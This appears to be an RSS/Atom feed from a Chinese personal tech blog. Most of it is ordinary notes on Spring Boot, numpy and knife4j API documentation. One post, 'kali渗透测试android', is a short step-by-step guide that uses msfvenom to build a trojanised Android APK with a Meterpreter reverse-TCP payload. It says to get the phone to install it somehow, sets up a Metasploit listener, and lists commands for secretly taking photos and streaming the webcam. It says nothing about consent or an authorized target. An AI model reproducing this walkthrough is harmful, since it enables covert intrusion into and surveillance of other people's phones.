class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;apple = &quot;</span> + apple);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果在控制台看到下列结果，就可证明注入成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple = com.example.demo.<span class="keyword">module</span>.Apple@75798d03</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="ComponentScan注解"><a href="#ComponentScan注解" class="headerlink" title="@ComponentScan注解"></a>@ComponentScan注解</h3><p>包扫描，<strong>默认情况下扫描的是当前这个类所在的包下面的所有类</strong>，所以建议放在根包下面，否则需要进行重新指定</p>]]></content>
    
    
    <summary type="html">SpringBootApplication 注解</summary>
    
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/categories/java%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://www.fomal.cc/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>numpy数据分析</title>
    <link href="https://www.fomal.cc/posts/9d3872d5.html"/>
    <id>https://www.fomal.cc/posts/9d3872d5.html</id>
    <published>2023-08-13T12:26:46.154Z</published>
    <updated>2023-06-17T10:43:55.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="我的博客部署成功了"><a href="#我的博客部署成功了" class="headerlink" title="我的博客部署成功了"></a>我的博客部署成功了</h2><h1 id="numpy数据分析"><a href="#numpy数据分析" class="headerlink" title="numpy数据分析**"></a>numpy数据分析**</h1><h2 id="numpy模块"><a href="#numpy模块" class="headerlink" title="numpy模块"></a>numpy模块</h2><h3 id="数组存在优先级："><a href="#数组存在优先级：" class="headerlink" title="数组存在优先级："></a>数组存在优先级：</h3><ol><li>字符串&gt;浮点型&gt;整数</li></ol><h3 id="数组常用方法："><a href="#数组常用方法：" class="headerlink" title="数组常用方法："></a>数组常用方法：</h3><ol><li><p>zero()</p></li><li><p>ones()</p></li><li><p>linspace()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.linspace(<span class="number">0</span>,<span class="number">100</span>,num=<span class="number">20</span>)  <span class="comment"># 返回从0大100的20个数的一维等差数列对应的数组</span></span><br></pre></td></tr></table></figure><p>​</p></li><li><p>arange()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.arange(<span class="number">10</span>,<span class="number">50</span>,step=<span class="number">2</span>)  <span class="comment"># 返回从10到50（不包括50）,步数为2的等差数列对应的一维数组</span></span><br></pre></td></tr></table></figure><p>​</p></li><li><p>random系列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.randint(<span class="number">0</span>,<span class="number">100</span>,size=(<span class="number">5</span>,<span class="number">3</span>)) <span class="comment"># 返回0到100间的五行三列的二维随机数</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="numpy常用属性"><a href="#numpy常用属性" class="headerlink" title="numpy常用属性"></a>numpy常用属性</h3><ol><li><p>shape   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.shape  <span class="comment"># 数组的形状，几行几列</span></span><br></pre></td></tr></table></figure></li><li><p>ndim</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.ndim  <span class="comment"># 返回的是数组的维度</span></span><br></pre></td></tr></table></figure></li><li><p>size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.size  <span class="comment"># 返回数组元素的个数</span></span><br></pre></td></tr></table></figure></li><li><p>dtype</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.dtype <span class="comment"># 返回是数组元素类型题</span></span><br></pre></td></tr></table></figure></li></ol><p>创建数组并制定元素类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],dtype=<span class="string">&#x27;int64&#x27;</span>)</span><br></pre></td></tr></table></figure><p>修改数组元素类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.dtype = <span class="string">&#x27;uint8&#x27;</span> <span class="comment"># 修改数组的元素类型</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">numpy数据分析笔记</summary>
    
    
    
    <category term="python笔记" scheme="https://www.fomal.cc/categories/python%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="python" scheme="https://www.fomal.cc/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>测试文章</title>
    <link href="https://www.fomal.cc/posts/7a6a6b5a.html"/>
    <id>https://www.fomal.cc/posts/7a6a6b5a.html</id>
    <published>2023-08-13T12:26:46.136Z</published>
    <updated>2023-06-17T10:43:55.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="这是一个测试文章"><a href="#这是一个测试文章" class="headerlink" title="这是一个测试文章"></a>这是一个测试文章</h2><p>以下为文章格式测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">这是一个测试文章</summary>
    
    
    
    <category term="java笔记" scheme="https://www.fomal.cc/categories/java%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://www.fomal.cc/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>knife4j制作api文档</title>
    <link href="https://www.fomal.cc/posts/b112853d.html"/>
    <id>https://www.fomal.cc/posts/b112853d.html</id>
    <published>2023-08-13T12:26:46.133Z</published>
    <updated>2023-06-23T16:25:02.472Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引入knife4j"><a href="#引入knife4j" class="headerlink" title="引入knife4j"></a>引入knife4j</h3><div class="table-container"><table><thead><tr><th style="text-align:center">版本</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">1.9.6</td><td style="text-align:center">蓝色皮肤风格，开始更名，增加更多后端模块</td></tr><tr><td style="text-align:center">2.0~2.0.5</td><td style="text-align:center">Ui重写，底层依赖的springfox框架版本是2.9.2</td></tr><tr><td style="text-align:center">2.0.6~</td><td style="text-align:center">springfox框架版本升级至2.10.5，OpenAPI规范是V2</td></tr><tr><td style="text-align:center">3.0~</td><td style="text-align:center">底层依赖spingfox框架版本升级至3.0.3，OpenAPI规范是V3</td></tr></tbody></table></div><p>以下为2.0.9依赖，相对比较稳定，3.X坑有点多</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.0</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="创建Swagger配置类"><a href="#创建Swagger配置类" class="headerlink" title="创建Swagger配置类"></a>创建Swagger配置类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.builders.RequestHandlerSelectors;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.service.ApiInfo;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.service.Contact;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.spi.DocumentationType;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.spring.web.plugins.Docket;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2WebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwaggerConfig</span> &#123;</span><br><span class="line">    <span class="comment">// 创建Docket存入容器，Docket代表一个接口文档</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">webApiConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">                <span class="comment">// 创建接口文档的具体信息</span></span><br><span class="line">                .apiInfo(webApiInfo())</span><br><span class="line">                <span class="comment">// 创建选择器，控制哪些接口被加入文档</span></span><br><span class="line">                .select()</span><br><span class="line">                <span class="comment">// 指定@ApiOperation标注的接口被加入文档</span></span><br><span class="line">                .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建接口文档的具体信息，会显示在接口文档页面中</span></span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">webApiInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">                <span class="comment">// 文档标题</span></span><br><span class="line">                .title(<span class="string">&quot;标题：系统接口文档&quot;</span>)</span><br><span class="line">                <span class="comment">// 文档描述</span></span><br><span class="line">                .description(<span class="string">&quot;描述：本文档描述了系统的接口定义&quot;</span>)</span><br><span class="line">                <span class="comment">// 版本</span></span><br><span class="line">                .version(<span class="string">&quot;1.0&quot;</span>)</span><br><span class="line">                <span class="comment">// 联系人信息</span></span><br><span class="line">                .contact(<span class="keyword">new</span> <span class="title class_">Contact</span>(<span class="string">&quot;龙场悟道中&quot;</span>, <span class="string">&quot;https://mentaltest.run&quot;</span>, <span class="string">&quot;mentaltest1225@gmail.com&quot;</span>))</span><br><span class="line">                <span class="comment">// 版权</span></span><br><span class="line">                .license(<span class="string">&quot;龙场悟道中&quot;</span>)</span><br><span class="line">                <span class="comment">// 版权地址</span></span><br><span class="line">                .licenseUrl(<span class="string">&quot;https://mentaltest.run&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="实体类测试"><a href="#实体类测试" class="headerlink" title="实体类测试"></a>实体类测试</h3><p>如果只是做了这些配置，并不会在接口文档中记录，如果需要被记录，则必须在加了swagger注解的controller中使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ApiModel(&quot;手机实体类&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Phone</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(&quot;id&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(&quot;手机名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(&quot;手机价格&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Double price;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="控制类测试"><a href="#控制类测试" class="headerlink" title="控制类测试"></a>控制类测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ll.knife4j_demo.entity.Phone;</span><br><span class="line"><span class="keyword">import</span> com.ll.knife4j_demo.entity.User;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;controller1&quot;)</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;这是一个应用&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;api1/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;api1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">api1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> <span class="meta">@ApiParam(&quot;用户id&quot;)</span> String id)</span>&#123;</span><br><span class="line">        <span class="comment">// 伪代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;api2&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;api2&quot;)</span></span><br><span class="line">    <span class="comment">// 如果这里没有引入User类，则不会在文档中出现User</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">api2</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">        <span class="comment">// 伪代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="YML文件相关配置"><a href="#YML文件相关配置" class="headerlink" title="YML文件相关配置"></a>YML文件相关配置</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">1225</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">demo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">knife4j:</span></span><br><span class="line">  <span class="comment"># 开启增强配置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># 开启认证功能，默认为false</span></span><br><span class="line">  <span class="attr">basic:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 用户名</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">luke</span></span><br><span class="line">    <span class="comment"># 密码</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">spring boot整合knife4j</summary>
    
    
    
    <category term="java" scheme="https://www.fomal.cc/categories/java/"/>
    
    
    <category term="java" scheme="https://www.fomal.cc/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试android</title>
    <link href="https://www.fomal.cc/posts/1caf87fd.html"/>
    <id>https://www.fomal.cc/posts/1caf87fd.html</id>
    <published>2023-08-13T12:26:46.130Z</published>
    <updated>2023-06-17T10:43:55.839Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境-kali-linux"><a href="#环境-kali-linux" class="headerlink" title="环境: kali linux"></a>环境: kali linux</h4><h4 id="目标：一台安卓机"><a href="#目标：一台安卓机" class="headerlink" title="目标：一台安卓机"></a>目标：一台安卓机</h4><p>ifconfig查看虚拟机ip</p><p>在终端输入命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a java --platform android -p android/meterpreter/reverse_tcp lhost=虚拟机ip lport=监听端口（例：<span class="number">3333</span>） -x test.apk R &gt; apk.apk </span><br></pre></td></tr></table></figure><p>在/home/用户名 文件夹中找到apk.apk文件，想办法给手机安装（微信传输会添加拓展名，QQ不会）</p><p>在终端输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>启动终端，然后一次输入下列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.u</span>se exploit/multi/handler 加载模块</span><br><span class="line"><span class="number">2.</span><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  选择Payload</span><br><span class="line"><span class="number">3.</span>show options 查看参数设置</span><br><span class="line"><span class="number">4.</span><span class="built_in">set</span> LHOST 虚拟机IP</span><br><span class="line"><span class="number">5.</span><span class="built_in">set</span> LPORT 监听端口（此处必须和前面一样）</span><br><span class="line"><span class="number">6.</span>exploit 开始监听</span><br></pre></td></tr></table></figure><p>如果手机上安装了木马，就会看见一个会话连接</p><p>以下是以下操作命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysinfo 查看手机操作系统</span><br><span class="line">webcam_list 查看手机摄影头有几个</span><br><span class="line">webcam_snap 隐秘拍照功能</span><br><span class="line">webcam_stream 开启摄像头</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">kali渗透测试android</summary>
    
    
    
    <category term="linux笔记" scheme="https://www.fomal.cc/categories/linux%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="linux" scheme="https://www.fomal.cc/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>【转载】火星之梦</title>
    <link href="https://www.fomal.cc/posts/633c41d7.html"/>
    <id>https://www.fomal.cc/posts/633c41d7.html</id>
    <published>2023-08-13T12:26:46.127Z</published>
    <updated>2023-07-02T05:50:34.080Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="caaf5ae18d741dcf644e3df0100a7c2142699070ec5f6a5198a1f28a511e2d67">b31d292328000830bc09f0012ca12b75754bb0a7e51542597975d6523a42ccb870ac5a1d3b65281d8203a448883197382c26229ae6869a0b30ec835b8d287614e3a3203a8bcb61402962dce13b9f9930202585103c9327886f94db1c8cab8aae4dbe637cb342372878b7173cc07dd1ac31d55ed1e35b3fc37cb2c751f5e6d017bb08a217a49a07d4f3dcd68dc1f21affacf918bc667ec400f7f0e4da8914250c72d9fe561d6fa5c5a813802129ee744e8e305ae66c76fdf6b4c90151d091d3d751d36b2217861b45c73397045dfcfef60c9ab92043d1eb2a45577913c048518d5b154ba8a8c8572634f59ec9a8549e8c2a3b72fecb51a088e78878fba56de7d06c5afc181f8242a1d4524dd1bac732b9169369b31698ccc1d1e69a8132e1ca836145c00070bcda68036e8619b9919cab1cf60e36055d582657f33ed10e076d35191f4fb008f4faf2452048ae0331834c1ed2fa7324c1d1cf2cc3eebab2ba53bd2d7e7106cb16d11be088f2c778153a53d3fadac2176645604772068ae644b3e3aeb08c4fcfa414684e5441fd5060e9d01cf579444d559e73f6d17dbcdc08c5f017a408b3a28f98763ccd4a807cc5a042a4576096ecb3a37e6033bf0b1f1ccf003b6dd7ce6c83deeab6abbab63de7565dcdf18d97244613f389b0fc21ae3a8bf63fa1487cc9d2ce5e2ee5faf62688e3aca9514918fc4bea52ab281cec7e3a58da6fe058ec331189a22d98738941d9378418290bb5ad2abf8a53d42e3dd17eb356d77404346b7aee6aa3650cb2b7fc81757d9153a554c54054812cf48ad013c4852a9cd960cefab71ba19d21d78355566d7d83de3bc2251f385ca33beed64ad526257cd1bb59e354dcd7039e42729f3f01fabfed1041295b9cdd30bd59c72850483664af6ba56e3d9242765a243b0b0e8a58d5b746c0cb02f8cae15c6d74c8c74d25f089de2bc4edfa99d6ad4c8a4e77f1515b7175097cc4c2884734370b91249df5cf051b6df5d588b6c47e5ddd4eb429c9c91a3c7557bfc4b56be3d4cc903e474a499280577049141f4260708fbf719ad9fe804a75b798cfbb45fef102ac3b7d3ea125457856dc68e30404defa435c6cfa5a6b47385b246512035aa86011ed79f3973eff405e2e4f0d6af185f207ea001068dfa4abff876e893d542437c054aea6b82814b261ca73c817bdb3fa4418722639da4e21ea5fa585562717b2f167eea89710bee08df95c74c0f4db935f059e04afe24ccb92c506593203e56b31cdeeacb824859d6e049dc1e3ab7e36cb03d1f659b1bec75a3b3e404a0c5532c90587f94e0ae19bc6b9f69a5913a99c3877948eec5cf99873e52889845cc786b69c8f7eae06cde5fbf08029ef7c4537ab54c594f347c93ec74699d2590c58716a0086758052176eac73f14421e92bb4666b780b4ebc56ec72b6aa5dbd1402b924d11920af5823e52c47db7388a7aa49e1dcef9375d1d0bbffdbdc9078c63b74c0fa9c0bc964f7e6038bc90c86f5459cc2b8ed51851bf53e6eba455da500f576822f946ea83b253108c520dcf347ff5f9a91edb8bcb44eaa3e4c8c6ea72973f60b6fabb90db51946f1bf851496c57989a3ce6819c92c8bbd0449cfb28de5921bb3b6901be791974da1698447f7dd5000a82dae3f8d6f76b824f26b0cea8ab26a4c38011d88f22ed58bff37e7988a56f2b4bd237792dce570ea7aa4c0c59ca8c50f35ff1b60ea59bc05be27d77053cfc819eb330649a5d28db4186d43c7d8edc39729661f31b3bbeb880d8af028196dcb22338480fbf7a8c8cc51e60c6f3baf741b6d9cb4b3999e587c0bfbf02b8c80b05c5843cd937c82aca9bc9dc5df1dbe23fad97ebd29464f224e0fd1a8ebd5f24b778204b805aac55a7fc6648ab1d539068b8c868dbe0e8a7168d77db8f9d70edf239cba061f22f84596c3a652defd1b359b1a0ae755cf4022cb806c3b83242fa47fa85226545e869303a97bcf0b5e00f12cbdae746ff86ecc5d835094494726657d2c5e864ceb83873264592466f4110d69076dab161ce193979711a57278a07a32cfe7d282df7a31f65f7c507fd926b4beede8247ed099e8a1abd88174aa32c6e166b1426aa771484017a7d8d2ef9d0d0f3af6e9ed049d170207b0136abd6b922b360567ff8d444d401eafcad2ae0c3bc20c8eaefb557d6d513bf0123bef0fadc29ea366c58061278c4bf54d65c6cdb8b9e31035c7824c26e0af94cca960a37c09860474310afd8f2a067ccbf3304432075a80b32f7b3bec95800a1edcd7357304e9871e0266a42cbd5ed6c4a443b753d631535e0ae8d81716b773c84dbcc770a9d2f166f50699be863132c7efc0d8e4dc32856c78d98d7fc886581b599673a491fb4a52511e68972202b62c22f18498126f33edbd6e7e8e15fb607e7a89e58a4ece64a98628f12d946ce7fce4dd4c85933f40cfedddc3528b05ae0a38f2db34d3aa4cd795ea7f50179e7890e9f3126ff65fa3c5b068245cd2cce9ee78d0bf3cae31b82cafe44e0baffd72fde3915120c27baf131be7a90a67a3fda421cec83af2e50a49a07665575f550ff0fa07de25cfca27cbb1f9a5eaf64a39f14f737de20921dce71542c5e8b492eee19168882acb6feac3d842862e3f8e24a3dfacce553e9331d3f83299d7bc5c3e3153caea8379a679d1bd463d18f8cf0c3a114d5137fa1c081994c0abfc6d8bad8ef03739cd4efb0d410d256cbfd5b2f7b3cafc5b3c1f6d04a40aa46d7100281cd39b5179c799985dc4cb9cc196c070b1fd30ff4c5195851033e4945bbc520ec063f9add272bbe8ab994762a4e1daa94d555586a219ee5c89e1111563b09c0f3191ab609368626ba601f74dc82fede3a97499a0eab95434dee8079b3d81e4e75a13204adb0ea297b382b73381a066e8edcb84615d91d9a69a1dd1bd6241086ca711a3503b48554881f13da39e3372fd5344592f738a3d9505c6514305ffdc28e7018d7b26c031774d485ec13b8bef5a99012fc6271491323c809003719bbb23f4fe3d28f93e75c226353dcaaf791fb36ef0a7460736b13a953b67741671d51731e2e88320bc2a4753c5b9131d3b8fe00f453f1341a9510c0eac814c670f5634c4ef38ef2466e0d5f4c15a30b34d207170b8b126c8bc2a3d3d871e089a232ddbfe84a8e62660c2421495474c32e377cb0f1468d33aa961f0abb1d740e2b1d92c67e07cbb2b5691cb668c4a477dd09fe9290c336c2605f3e0ebc923e9ebb750ac25ed6703f59d78e38958d1614f847c1419cbfd233c3b18fd2c029c4353be0d7d7b0a5562beab921a176a146bf500050b0e53dfa20989993876a5599b8e9f909bc1729af6d8de507b13664d975c673a8cef7b739cb5b3fae0fc8a9dd20a82884d2540241d2605897153e94b72e0166d2ee7c8514b023ef3778ceb45d81d1f68fd97ead922114af248ca9240cf5cfcee4d335e074821d3980c5fb3c6a50499a00cb77fe2a71e162304687219091883c639db976e507457a3c418553c1310252af73766b03757d25671d85fcbfdc02dac6796ba9f1f8293bb34e782890fdbe29db5a0285c3b15064b0b58d0c272c574ae56b9b0015df4aa472e875e1abb70d44bc2e3832ae6a13ae60845157154238586f1891979b87c0bef59294339bd9d983cca9524c825cb604c34928bc45db4f75bdaccf21a05ae61f61c007d3b9d1e4c88fe50345f96a5f5af961875fdf9a00eae2a62b208e0b257786a3ee969a552510852817db9f02d9acfcd143f06b1fd07c8bbf0650e37cdd7cd164ddab32c231a390c7bd71726e6a9222bbf429735dc8d08e0fdefea7d2990528854a37286eadc223394764ecbc596f6544a406252621ba19ca47423b298b74aa9c1a4ead193b5f33fa1c07a215cb6eb74852eace3ca3dec1438dfcecbdeb109404b44736cc07532acc34061508aad62e7965a5dd7c33427ef65de93f6b9823d993b9680128e154215c524727f5dfcf23bd729d65a498f7e27711861c0034a27cb9b5735b4b3af9e835ff88f4db5bff96bb60004f11422f0c93df1c05392ec2ca9efa41098d5cd56cd5ceaa025fb93bc25ce817f86eab7fd1037f67229de574c267949d03249ed5d4058e95c4aa5ede8113c547a01795b808ac5c14fa1132f0d29aeba9aa3c4f10038e860131c390b50795fc412c0ce3ecd5a29df68e7f6cf7d8eae473673271e7f93516670bd714c2f03f7391fe69237ebbd47a82752758dad3d6aa03358b831dff246792523428fac08853feec324ecbe0a0459f40f44f597979be398a9ec49383ef9ef131a8858ba29160dad5291287f55d6b4d67e9c5997e3cc58c9835c6ccf93ed3348e521a23ea252a8e053ff924d5b540abf8a25245a419f630d8a6d3b03cbdd1d28908e21628bdb03ebdfb1deaf4163c8e62b274b84a98b567fc90ae79e4d3e732d580f3c78996713c4d1b102dbaaf6bbb544b72c373de8a6dd57a2834c0d9ca943ab2ec07243754da968c7388655e8f60ec530926ab9481d04e4919e5